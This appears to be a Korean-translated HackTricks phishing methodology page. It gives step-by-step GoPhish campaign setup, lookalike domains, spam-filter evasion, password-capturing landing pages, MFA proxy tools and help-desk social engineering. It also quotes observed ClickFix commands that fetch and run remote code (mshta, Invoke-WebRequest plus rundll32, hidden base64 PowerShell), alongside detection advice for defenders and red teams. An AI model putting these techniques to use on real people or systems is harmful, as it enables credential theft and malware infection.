# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 피해자 정찰
1. **피해자 도메인**을 선택합니다.
2. 기본적인 웹 열거를 수행하여 피해자가 사용하는 **로그인 포털을 검색**하고, 어떤 포털을 **사칭할지 결정**합니다.
3. **OSINT**를 사용하여 **이메일을 찾습니다**.
2. 환경 준비
1. phishing assessment에 사용할 **도메인을 구매**합니다.
2. 이메일 서비스 관련 레코드(SPF, DMARC, DKIM, rDNS)를 **구성**합니다.
3. VPS에 **gophish**를 구성합니다.
3. campaign 준비
1. **이메일 템플릿**을 준비합니다.
2. 자격 증명을 탈취할 **웹 페이지**를 준비합니다.
4. campaign을 시작합니다!

## 유사한 도메인 이름 생성 또는 신뢰할 수 있는 도메인 구매

### Domain Name Variation Techniques

- **Keyword**: 도메인 이름에 원본 도메인의 중요한 **keyword**가 **포함**됩니다(예: zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: subdomain의 **dot을 hyphen으로 변경**합니다(예: www-zelster.com).
- **New TLD**: **새로운 TLD**를 사용하는 동일한 도메인입니다(예: zelster.org).
- **Homoglyph**: 도메인 이름의 문자를 **비슷하게 보이는 문자**로 **대체**합니다(예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 도메인 이름 내의 **두 문자를 서로 바꿉니다**(예: zelsetr.com).
- **Singularization/Pluralization**: 도메인 이름 끝에 “s”를 추가하거나 제거합니다(예: zeltsers.com).
- **Omission**: 도메인 이름에서 문자 하나를 **제거**합니다(예: zelser.com).
- **Repetition:** 문자 하나를 **반복**합니다(예: zeltsser.com).
- **Replacement**: Homoglyph와 유사하지만 stealth가 떨어집니다. 도메인 이름의 문자 하나를 대체하며, 원래 문자의 키보드상 인접한 문자를 사용할 수도 있습니다(예: zektser.com).
- **Subdomained**: 도메인 이름 내부에 **dot**을 삽입합니다(예: ze.lster.com).
- **Insertion**: 도메인 이름에 문자를 **삽입**합니다(예: zerltser.com).
- **Missing dot**: TLD를 도메인 이름에 추가합니다(예: zelstercom.com).

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

여러 요인으로 인해 저장되었거나 통신 중인 일부 bit가 **자동으로 뒤집힐 가능성이 있습니다**. 이러한 요인으로는 solar flare, cosmic ray 또는 hardware error 등이 있습니다.

이 개념을 **DNS 요청에 적용하면**, **DNS server가 수신하는 도메인**이 처음 요청된 도메인과 다를 수 있습니다.

예를 들어 도메인 "windows.com"에서 단일 bit가 변경되면 "windnws.com"으로 바뀔 수 있습니다.

공격자는 피해자 도메인과 유사한 **여러 bit-flipping 도메인을 등록하여 이를 악용**할 수 있습니다. 이들의 목적은 정상 사용자를 자신의 infrastructure로 redirect하는 것입니다.

자세한 내용은 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### 신뢰할 수 있는 도메인 구매

[https://www.expireddomains.net/](https://www.expireddomains.net)에서 사용할 수 있는 만료된 도메인을 검색할 수 있습니다.\
구매하려는 만료 도메인이 **이미 양호한 SEO를 보유하고 있는지** 확인하려면 다음에서 해당 도메인이 어떻게 분류되는지 검색할 수 있습니다.

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 이메일 검색

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% 무료)
- [https://phonebook.cz/](https://phonebook.cz) (100% 무료)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

유효한 이메일 주소를 **더 많이 검색**하거나 이미 검색한 주소를 **검증**하려면 피해자의 smtp server에 brute-force할 수 있는지 확인할 수 있습니다. [여기에서 이메일 주소를 검증/검색하는 방법을 알아보세요](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
또한 사용자가 **메일에 액세스하기 위해 웹 포털을 사용하는 경우**, 해당 포털이 **username brute force**에 취약한지 확인하고, 가능하다면 vulnerability를 exploit하는 것도 잊지 마세요.

## GoPhish 구성

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)에서 다운로드할 수 있습니다.

`/opt/gophish` 내부에 다운로드한 파일의 압축을 해제하고 `/opt/gophish/gophish`를 실행합니다.\
출력 결과의 port 3333에서 admin user에 사용할 password가 제공됩니다. 따라서 해당 port에 액세스하고 해당 credential을 사용하여 admin password를 변경합니다. 해당 port를 local로 tunnel해야 할 수도 있습니다:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS certificate configuration**

이 단계에 앞서 사용할 **domain을 이미 구매**했어야 하며, 해당 domain은 **gophish**를 구성하는 **VPS의 IP**를 **가리키고 있어야** 합니다.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**메일 구성**

설치를 시작합니다: `apt-get install postfix`

그런 다음 다음 파일에 domain을 추가합니다:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

또한 `/etc/postfix/main.cf` 내부에서 다음 변수의 값을 변경합니다.

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

마지막으로 **`/etc/hostname`** 및 **`/etc/mailname`** 파일을 domain name으로 수정한 다음 **VPS를 재시작합니다.**

이제 `mail.<domain>`에 대한 **DNS A record**를 생성하고 VPS의 **ip address**를 가리키도록 설정합니다. 또한 `mail.<domain>`을 가리키는 **DNS MX record**를 생성합니다.

이제 email 전송을 테스트해 보겠습니다:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 설정**

gophish 실행을 중지하고 구성합니다.\
`/opt/gophish/config.json`을 다음과 같이 수정합니다(https 사용에 유의):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service 구성**

gophish service를 생성하여 자동으로 시작되고 service로 관리할 수 있도록 하려면 다음 내용으로 `/etc/init.d/gophish` 파일을 생성합니다:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
다음을 수행하여 서비스를 구성하고 확인합니다:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## mail server 및 domain 구성

### 기다리고 합법적으로 보이기

domain이 오래될수록 spam으로 탐지될 가능성이 낮아집니다. 따라서 phishing assessment 전에 가능한 한 오래(최소 1주일) 기다려야 합니다. 또한 평판이 좋은 분야에 대한 페이지를 게시하면 획득하는 평판이 더 좋아집니다.

일주일을 기다려야 하더라도 지금 모든 구성을 완료할 수 있다는 점에 유의하세요.

### Reverse DNS (rDNS) record 구성

VPS의 IP address가 domain name으로 resolve되도록 rDNS (PTR) record를 설정합니다.

### Sender Policy Framework (SPF) Record

**새 domain에 SPF record를 구성해야 합니다**. SPF record가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

[https://www.spfwizard.net/](https://www.spfwizard.net)를 사용하여 SPF policy를 생성할 수 있습니다(VPS machine의 IP 사용).

![phishing domain용 SPF record 생성을 위한 SPF Wizard form](<../../images/image (1037).png>)

다음은 domain 내부의 TXT record에 설정해야 하는 content입니다:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

**새 도메인에 DMARC record를 구성해야 합니다.** DMARC record가 무엇인지 모르는 경우 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

호스트 이름이 `_dmarc.<domain>`을 가리키도록 새 DNS TXT record를 생성하고, 다음 내용을 입력해야 합니다:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**새 도메인에 DKIM을 구성해야 합니다**. DMARC 레코드가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

이 튜토리얼은 다음을 기반으로 합니다: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM 키가 생성하는 두 B64 값을 연결해야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 이메일 구성 점수 테스트

[https://www.mail-tester.com/](https://www.mail-tester.com)을 사용하여 테스트할 수 있습니다\
페이지에 접속한 다음, 해당 서비스에서 제공하는 주소로 이메일을 보내세요:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
`check-auth@verifier.port25.com`으로 이메일을 보내고 **응답을 읽어** 이메일 구성을 **확인할 수도 있습니다**(이를 위해서는 포트 **25**를 **열어야** 하며, root로 이메일을 보내는 경우 _/var/mail/root_ 파일에서 응답을 확인할 수 있습니다).\
모든 테스트를 통과하는지 확인하세요:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
**제어 중인 Gmail로 메시지를 보낸 다음**, Gmail 받은편지함에서 **이메일 헤더**를 확인할 수도 있습니다. `Authentication-Results` 헤더 필드에 `dkim=pass`가 있어야 합니다.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist에서 제거

[www.mail-tester.com](https://www.mail-tester.com) 페이지를 사용하면 도메인이 spamhouse에 의해 차단되고 있는지 확인할 수 있습니다. 다음에서 도메인/IP 제거를 요청할 수 있습니다: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist에서 제거

​​다음에서 도메인/IP 제거를 요청할 수 있습니다: [https://sender.office.com/](https://sender.office.com).

## GoPhish Campaign 생성 및 실행

### Sending Profile

- 발신자 프로필을 식별할 수 있는 **이름**을 설정합니다.
- phishing 이메일을 보낼 계정을 결정합니다. 제안: _noreply, support, servicedesk, salesforce..._
- username과 password는 비워 둘 수 있지만, Ignore Certificate Errors를 선택해야 합니다.

![GoPhish Campaign 생성 및 실행 - Sending Profile: username과 password는 비워 둘 수 있지만, Ignore Certificate Errors를 선택해야 합니다](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 모든 기능이 정상적으로 작동하는지 테스트하려면 "**Send Test Email**" 기능을 사용하는 것이 좋습니다.\
> 테스트 중 blacklist에 등록되는 것을 방지하려면 테스트 이메일을 **10min mail 주소**로 보내는 것을 권장합니다.

### Email Template

- 템플릿을 식별할 수 있는 **이름**을 설정합니다.
- 그런 다음 **subject**를 작성합니다(특별할 필요 없이 일반적인 이메일에서 읽을 법한 내용으로 작성합니다).
- "**Add Tracking Image**"가 선택되어 있는지 확인합니다.
- **email template**을 작성합니다(다음 예시처럼 변수를 사용할 수 있습니다).
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
**이메일의 신뢰도를 높이기 위해**, 고객의 이메일에 사용된 서명을 사용하는 것이 좋습니다. 다음을 권장합니다:

- **존재하지 않는 주소**로 이메일을 보내고 응답에 서명이 포함되어 있는지 확인합니다.
- info@ex.com, press@ex.com 또는 public@ex.com과 같은 **공개 이메일**을 찾아 이메일을 보내고 응답을 기다립니다.
- **유효한 것으로 확인된** 이메일에 연락하고 응답을 기다립니다.

![Sending Profile - Email Template: 유효한 것으로 확인된 이메일에 연락하고 응답을 기다립니다](<../../images/image (80).png>)

> [!TIP]
> Email Template에서는 **보낼 파일을 첨부**할 수도 있습니다. 특수하게 제작된 파일/문서를 사용해 NTLM challenge도 탈취하려면 [이 페이지를 읽어보세요](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- **이름을 작성**합니다.
- 웹 페이지의 **HTML code를 작성**합니다. 웹 페이지를 **import**할 수도 있습니다.
- **Capture Submitted Data**와 **Capture Passwords**를 선택합니다.
- **redirection**을 설정합니다.

![Email Template - Landing Page: Capture Submitted Data와 Capture Passwords 선택](<../../images/image (826).png>)

> [!TIP]
> 일반적으로 페이지의 HTML code를 수정하고, **결과가 마음에 들 때까지** 로컬에서 몇 가지 테스트를 수행해야 합니다(일부 Apache server를 사용할 수도 있음). 그런 다음 해당 HTML code를 상자에 작성합니다.\
> HTML에 사용할 **static resources**(일부 CSS 및 JS 페이지 등)가 필요한 경우 _**/opt/gophish/static/endpoint**_에 저장한 다음 _**/static/\<filename>**_에서 액세스할 수 있습니다.

> [!TIP]
> redirection의 경우 **피해자의 정상적인 메인 웹 페이지로 사용자를 redirect**하거나, 예를 들어 _/static/migration.html_로 redirect한 뒤 일부 **spinning wheel (**[**https://loading.io/**](https://loading.io)**)을 5초 동안 표시하고 프로세스가 성공했다고 알릴** 수 있습니다.

### Users & Groups

- 이름을 설정합니다.
- **데이터를 import**합니다(예제에서 template을 사용하려면 각 사용자의 firstname, last name 및 email address가 필요합니다).

![Landing Page - Users & Groups: 데이터를 import합니다(예제에서 template을 사용하려면 각 사용자의 firstname, last name 및 email address가 필요합니다)](<../../images/image (163).png>)

### Campaign

마지막으로 이름, email template, landing page, URL, sending profile 및 group을 선택하여 campaign을 생성합니다. URL은 피해자에게 전송될 link입니다.

**Sending Profile을 사용하면 최종 phishing email이 어떻게 표시되는지 확인하기 위해 test email을 보낼 수 있습니다**:

![Users & Groups - Campaign: Sending Profile을 사용하면 최종 phishing email이 어떻게 표시되는지 확인하기 위해 test email을 보낼 수 있습니다](<../../images/image (192).png>)

모든 준비가 완료되면 campaign을 실행합니다!

## Website Cloning

어떤 이유로든 웹 사이트를 clone하려면 다음 페이지를 확인하세요:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

일부 phishing assessment(주로 Red Team assessment)에서는 **일종의 backdoor가 포함된 파일**(C2 또는 authentication을 trigger하는 파일 등)도 **보내고 싶을** 수 있습니다.\
몇 가지 예시는 다음 페이지를 확인하세요:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

이전 attack은 실제 웹 사이트를 위조하고 사용자가 입력한 정보를 수집하므로 상당히 교묘합니다. 하지만 사용자가 올바른 password를 입력하지 않았거나 위조한 application이 2FA로 구성되어 있다면, **이 정보만으로는 속은 사용자를 impersonate할 수 없습니다**.

이때 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) 및 [**muraena**](https://github.com/muraenateam/muraena)와 같은 tool이 유용합니다. 이 tool을 사용하면 MitM과 유사한 attack을 수행할 수 있습니다. 기본적으로 attack은 다음과 같이 동작합니다:

1. 실제 웹 페이지의 login form을 **impersonate**합니다.
2. 사용자가 **credentials**를 fake page로 **전송**하면 tool이 이를 실제 웹 페이지로 전송하고, **credentials가 유효한지 확인**합니다.
3. 계정이 **2FA**로 구성되어 있다면 MitM page가 이를 요청하고, **사용자가 입력**하면 tool이 실제 웹 페이지로 전송합니다.
4. 사용자가 authentication되면, tool이 MitM을 수행하는 동안 attacker는 모든 interaction의 **credentials, 2FA, cookie 및 모든 정보**를 **capture**하게 됩니다.

### Via VNC

원래 웹 사이트와 동일하게 보이는 **malicious page로 피해자를 보내는 대신**, 실제 웹 페이지에 연결된 browser가 실행되는 **VNC session으로 보내면 어떨까요**? 사용자가 수행하는 작업을 보고, password, 사용된 MFA, cookie 등을 탈취할 수 있습니다.\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)를 사용하면 이를 수행할 수 있습니다.<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

발각되었는지 확인하는 가장 좋은 방법 중 하나는 **blacklist에서 자신의 domain을 검색하는 것**입니다. 목록에 표시된다면 어떤 방식으로든 domain이 의심스러운 것으로 detection된 것입니다.\
domain이 blacklist에 포함되어 있는지 확인하는 간단한 방법은 [https://malwareworld.com/](https://malwareworld.com)을 사용하는 것입니다.

하지만 다음 문서에서 설명하는 것처럼 피해자가 **실제 환경에서 suspicious phishing activity를 적극적으로 찾고 있는지** 확인할 수 있는 다른 방법도 있습니다:


{{#ref}}
detecting-phising.md
{{#endref}}

**피해자의 domain과 매우 유사한 이름의 domain을 구매**하거나, 사용자가 제어하는 domain의 **subdomain**에 피해자 domain의 **keyword가 포함된** **certificate를 생성**할 수 있습니다. **피해자**가 해당 domain과 어떤 종류의 **DNS 또는 HTTP interaction**이라도 수행하면, 해당 사용자가 suspicious domain을 **적극적으로 검색하고 있다는 것**을 알 수 있으므로 매우 stealth하게 행동해야 합니다.<sup>[[2]](#references)</sup>

### phishing 평가

[**Phishious** ](https://github.com/Rices/Phishious)를 사용하여 email이 spam folder로 들어갈지, 차단될지 또는 정상적으로 전달될지 평가합니다.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set은 email lure를 완전히 건너뛰고 **service-desk / identity-recovery workflow를 직접 target하여 MFA를 우회**하는 경우가 점점 늘고 있습니다. 이 attack은 완전히 "living-off-the-land" 방식입니다. operator가 유효한 credentials를 확보하면 built-in admin tooling을 사용해 pivot하며, malware가 필요하지 않습니다.<sup>[[6]](#references)</sup>

### Attack flow
1. 피해자에 대한 Recon
* LinkedIn, data breach, public GitHub 등에서 개인 및 기업 세부 정보를 수집합니다.
* high-value identity(executive, IT, finance)를 식별하고 password / MFA reset을 위한 **정확한 help-desk process**를 파악합니다.
2. Real-time social engineering
* target을 impersonate하여 전화, Teams 또는 chat으로 help-desk에 연락합니다(대개 **spoofed caller-ID** 또는 **cloned voice** 사용).
* 사전에 수집한 PII를 제공하여 knowledge-based verification을 통과합니다.
* agent가 **MFA secret을 reset**하거나 등록된 mobile number에 대해 **SIM-swap**을 수행하도록 설득합니다.
3. 즉각적인 post-access action(실제 사례에서는 ≤60분)
* 모든 web SSO portal을 통해 foothold를 확보합니다.
* built-in tool을 사용해 AD / AzureAD를 enumerate합니다(바이너리는 drop하지 않음):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 환경에서 이미 whitelist된 **WMI**, **PsExec** 또는 정상적인 **RMM** agent를 사용해 lateral movement를 수행합니다.

### Detection & Mitigation
* help-desk identity recovery를 **privileged operation**으로 취급하고 step-up auth 및 manager approval을 요구합니다.
* 다음 항목에 alert를 생성하는 **Identity Threat Detection & Response (ITDR)** / **UEBA** rule을 배포합니다:
* MFA method 변경 + new device / geo에서의 authentication.
* 동일한 principal에 대한 즉각적인 elevation(user-→-admin).
* help-desk call을 기록하고 reset 전에 이미 등록된 number로 **call-back**을 강제합니다.
* 새로 reset된 account가 high-privilege token을 자동으로 상속하지 않도록 **Just-In-Time (JIT) / Privileged Access**를 구현합니다.

---

## 대규모 Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew는 **search engine 및 ad network를 delivery channel로 전환하는 mass attack**을 통해 high-touch operation의 비용을 상쇄합니다.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising**은 `chromium-update[.]site`와 같은 fake result를 search ad 상단에 노출합니다.
2. 피해자는 작은 **first-stage loader**(주로 JS/HTA/ISO)를 다운로드합니다. Unit 42에서 확인한 예시는 다음과 같습니다:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader는 browser cookie와 credential DB를 exfiltrate한 다음, 무엇을 배포할지 *realtime*으로 결정하는 **silent loader**를 가져옵니다:
* RAT(예: AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component(registry Run key + scheduled task)

### Hardening tips
* 새로 등록된 domain을 차단하고 email뿐만 아니라 *search-ad*에도 **Advanced DNS / URL Filtering**을 적용합니다.
* software installation을 signed MSI / Store package로 제한하고, policy를 통해 `HTA`, `ISO`, `VBS` execution을 거부합니다.
* browser가 installer를 실행할 때 생성되는 child process를 monitor합니다:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader가 자주 악용하는 LOLBin(예: `regsvr32`, `curl`, `mshta`)을 hunt합니다.

### TDS handoff를 이용한 Download-button click hijacking
일부 fake software portal은 visible download `href`가 **실제 GitHub/release URL**을 가리키도록 유지하지만, JavaScript를 사용해 사용자의 **첫 번째 interaction을 hijack**하고 대신 피해자를 **Traffic Distribution System (TDS) chain**으로 보냅니다.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
주요 특징:
- The hook은 보통 `document`에서 **capture phase**(`true`)로 실행되므로 site handlers보다 먼저 동작합니다.
- Chrome은 redirect를 유효한 **user gesture**에 연결하고 popup-blocker 우회를 개선하기 위해 `click` 대신 `mousedown`을 사용하는 경우가 많습니다.
- 일부 변형은 `about:blank`을 미리 열거나 `<a target="_blank">` 클릭을 합성한 뒤, 나중에 TDS URL을 할당합니다.
- Browser-side cap은 일반적으로 `localStorage`에 저장되므로 **first click**은 malware로 연결될 수 있지만, 새로고침이나 재시도 시에는 benign-looking visible link로 되돌아갈 수 있습니다.
- TDS는 referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context 및 per-session counters를 기준으로 분기할 수 있으므로 analyst replay 결과가 비결정적일 수 있습니다.

Defender 아이디어:
- **displayed** `href`와 클릭 시 생성되는 **actual** navigation target을 비교합니다.
- `window.open`, `about:blank` 또는 synthetic anchor clicks 주변에서 `preventDefault()`와 `stopImmediatePropagation()`을 모두 호출하는 `document.addEventListener(..., true)` handlers를 탐색합니다.
- 새로 등록된 software-download domains가 모두 동일한 CloudFront/JS stage를 로드하는 cluster는 high-signal SEO-poisoning/TDS 패턴으로 취급합니다.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
일부 TDS branches는 피해자에게 다음과 같은 trusted Windows binary를 실행하도록 안내하는 fake verification page(Cloudflare/IUAM style)로 연결됩니다:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
참고:
- `mshta.exe`는 URL이 `.7z` archive인 것처럼 가장하더라도 response 시작 부분의 **HTA/VBScript**를 실행합니다. 뒤에 추가된 archive data는 순수한 decoy일 수 있습니다.
- 후속 stage에서는 file type에 대해 계속 거짓 정보를 제공하는 경우가 많습니다(`.rtf`는 PowerShell, `.asar`는 Python, padding된 binary가 포함된 ZIP 등). 이후 **manual PE mapping / in-memory execution**으로 전환합니다.
- 이러한 chain 중 하나에 대응하는 경우, 첫 번째 성공적인 실행부터 **network + memory**를 보존하십시오. 이후 replay에서는 benign installer/SFX path만 표시되거나, payload/key release가 원래 TDS session에 바인딩되어 있어 실패할 수 있습니다.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: **Update** button을 클릭하면 단계별 “fix” instructions를 표시하는 국가 CERT advisory clone입니다. Victim에게 DLL을 다운로드한 다음 `rundll32`로 실행하는 batch를 실행하도록 안내합니다.<sup>[[12]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`는 payload를 `%TEMP%`에 저장하고, 짧은 sleep은 network jitter를 숨긴 다음 `rundll32`가 exported entrypoint(`notepad`)를 호출합니다.
* DLL은 host identity를 beacon으로 전송하고 몇 분마다 C2를 polling합니다. Remote tasking은 **base64-encoded PowerShell** 형태로 전송되며, policy bypass와 함께 hidden 상태로 실행됩니다.
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 이를 통해 C2 flexibility가 유지됩니다(server는 DLL을 update하지 않고도 task를 교체할 수 있음). 또한 console window를 숨깁니다. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`을 함께 사용하는 `rundll32.exe`의 PowerShell child process를 hunt하십시오.
* Defenders는 DLL load 이후 `...page.php?tynor=<COMPUTER>sss<USER>` 형식의 HTTP(S) callback과 5분 polling interval을 확인할 수 있습니다.

---

## AI-Enhanced Phishing Operations
Attackers는 이제 **LLM & voice-clone APIs**를 chain하여 완전히 personalized된 lure와 real-time interaction을 수행합니다.

| Layer | Threat actor의 Example use |
|-------|-----------------------------|
|Automation|무작위 wording과 tracking link를 사용하여 100k건 이상의 email / SMS를 generate & send합니다.|
|Generative AI|공개된 M&A와 social media의 private joke를 언급하는 *one-off* email을 생성하고, callback scam에서 CEO의 deep-fake voice를 사용합니다.|
|Agentic AI|Domain을 autonomously register하고, open-source intel을 scrape하며, victim이 click했지만 credential을 submit하지 않은 경우 next-stage mail을 작성합니다.|

**Defence:**
• 신뢰할 수 없는 automation에서 전송된 message를 강조하는 **dynamic banner**를 추가합니다(ARC/DKIM anomaly 사용).
• High-risk phone request에 **voice-biometric challenge phrase**를 적용합니다.
• Awareness programme에서 AI-generated lure를 지속적으로 simulate하십시오. Static template은 obsolete 상태입니다.

Credential phishing을 위한 agentic browsing abuse도 참고하십시오:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory 및 detection을 위한 local CLI tool과 MCP의 AI agent abuse도 참고하십시오:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

